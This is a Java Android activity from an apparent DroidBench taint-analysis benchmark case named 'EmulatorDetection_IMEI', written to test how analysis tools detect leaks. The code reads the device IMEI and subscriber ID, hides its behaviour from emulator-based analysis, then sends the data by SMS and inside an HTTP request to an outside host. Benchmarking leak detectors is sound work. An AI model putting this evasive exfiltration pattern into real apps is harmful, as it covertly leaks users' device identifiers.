package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name EmulatorDetection_IMEI
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sends the IMEI as an SMS message and writes it to the log file. Emulator detection
 * 		is performed by cutting the secret message at an index computed on the IMEI which is known
 * 		to always be 000..0 on an emulator.
 * @dataflow onCreate: imei -> SMS & Log 
 * @number_of_leaks 2
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
		
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telephonyManager.getDeviceId(); //source
		String suffix = "000000000000000";
		String prefix = telephonyManager.getSubscriberId(); // source
		String msg = prefix + suffix;
		
		int zeroPos = 0;
		while (zeroPos < imei.length()) {
			if (imei.charAt(zeroPos) == '0')
				zeroPos++;
			else {
				zeroPos = 0;
				break;
			}
		}
		
		String newImei = msg.substring(zeroPos, zeroPos + Math.min(prefix.length(), msg.length() - 1));
		Log.d("DROIDBENCH", newImei);

		SmsManager sm = SmsManager.getDefault();
    	sm.sendTextMessage("+49 123", null, newImei, null, null); //sink, potential leak

		try {
			connect(newImei);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.com/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}
	
}
